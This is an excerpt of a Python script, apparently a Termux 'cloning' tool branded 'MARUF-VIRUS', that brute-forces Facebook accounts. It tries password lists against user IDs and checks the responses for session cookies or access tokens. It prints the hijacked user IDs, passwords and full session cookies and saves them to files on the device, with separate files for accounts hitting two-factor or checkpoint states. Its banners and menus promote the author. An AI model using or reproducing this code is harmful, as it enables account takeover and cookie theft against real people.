...
\033[1;93mM\033[1;94mA\033[1;91mR\033[1;92mU\033[1;90mF\033[1;92m-\033[1;91m𝙑\033[1;94m𝙄\033[1;93m𝙍\033[1;96m𝙐\033[1;95m𝙎
   
 
   \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
   ║  \x1b[97m\033[37;41m  ASKED YOU PAPA HWO I AM MARUF   \033[0;m   \33[1;92m    ║
   \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝        """)    
...
os.system('xdg-open https://github.com/MARUF-VIRUS-XD')
name=fuckx.upper()

jalan('\x1b[1;31mMARUF CYBER  INFINITY CLONING START PLEASE WAIT ..........')
time.sleep(2)
os.system('clear')
loading()
...
def banner():
 ...
 \033[1;91m\ \    / /_   _|  __ \| |  | |/ ____|   \ \ / /
  \033[1;94m\ \  / /  | | | |__) | |  | | (___ _____\ V / 
   ...
   \033[1;93mM\033[1;94mA\033[1;91mR\033[1;92mU\033[1;95mF\033[1;92m-\033[1;91m𝙑\033[1;94m𝙄\033[1;93m𝙍\033[1;96m𝙐\033[1;95m𝙎
    ...
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      ...
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}MARUF KHAN            {N}{M}║
      {H}║{M}[{H}•{M}] GITHUB    : {H}MARUF-VIRUS-XD{N}       {H}  ║
...
def main():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}MARUF GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}MARUF KHAN')
    print(f' ')
...
def _pornhub_():
    ...
    if sh =='U':
       ...
       _pornhub_()
        ...
        os.system('xdg-open https://github.com/maruf5284/CYBER-ARMY-71')
        _pornhub_()
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/MARUF/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
...
def gmail():
    ...
    pom = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
    if pom =='U':
       os.system('xdg-open https://www.facebook.com/md.maruf.molla.1000?mibextid=ZbWKwL')
       _pornhub_()
    elif pom =='00':
        _pompom_()
        os.system('xdg-open https://m.me/j/AbZeLBjhDJ0jQC6f/')
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}MARUF{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            shanto = random.choice(["\x1b[1;91mMARUF","\x1b[1;92mMARUF","\x1b[1;93mMARUF","\x1b[1;94mMARUF","\x1b[1;95mMARUF","\x1b[1;96mMARUF","\x1b[1;97mMARUF","\x1b[1;91mMARUF","\x1b[1;92mMARUF","\x1b[1;93mMARUF","\x1b[1;94mMARUF","\x1b[1;95mMARUF","\x1b[1;96mMARUF"])
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MARUF-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MARUF-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MARUF-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in shanto:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MARUF-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[MARUF-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/MARUF-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMARUF\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mMARUF","\x1b[1;92mMARUF","\x1b[1;93mMARUF","\x1b[1;94mMARUF","\x1b[1;95mMARUF","\x1b[1;96mMARUF","\x1b[1;97mMARUF","\x1b[1;91mMARUF","\x1b[1;92mMARUF","\x1b[1;93mMARUF","\x1b[1;94mMARUF","\x1b[1;95mMARUF","\x1b[1;96mMARUF"])
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MARUF-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MARUF-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mMARUF","\x1b[1;92mMARUF","\x1b[1;93mMARUF","\x1b[1;94mMARUF","\x1b[1;95mMARUF","\x1b[1;96mMARUF","\x1b[1;97mMARUF","\x1b[1;91mMARUF","\x1b[1;92mMARUF","\x1b[1;93mMARUF","\x1b[1;94mMARUF","\x1b[1;95mMARUF","\x1b[1;96mMARUF"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[MARUF-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MARUF-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[MARUF-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/MARUF-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
